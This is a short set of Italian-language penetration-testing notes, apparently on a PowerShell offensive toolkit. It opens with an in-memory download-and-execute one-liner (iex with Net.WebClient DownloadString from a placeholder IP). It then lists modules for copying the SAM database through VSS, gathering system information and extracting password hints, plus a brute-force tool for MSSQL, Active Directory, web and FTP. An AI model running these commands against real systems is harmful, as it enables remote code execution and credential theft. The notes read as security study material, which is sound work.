==Carica gli script usando metodi di upload in memoria come Net.WebClient o DownloadString==
```powershell
iex (New-Object Net.WebClient).DownloadString("HTTP://<IP>/<MODULO>"); <NOME MODULO>
```
### **GATHER**
<h3>Copy-VSS</h3>
Copia il database sam usand il servizio VSS
![[Pasted image 20230505115112.png]]
<h3>Get-Information</h3>
Molto utile, da tutta questa roba:
![[Pasted image 20230505114938.png]]
<h3>Get-PassHints</h3>
Ottieni tutti gli indizi per le passwords
![[Pasted image 20230505115134.png]]
### **BRUTEFORCE**
è un tool che permette di eseguire bruteforce di MSSQL, Active Directory, web e ftp finche si ha una lista di usernames e passwords.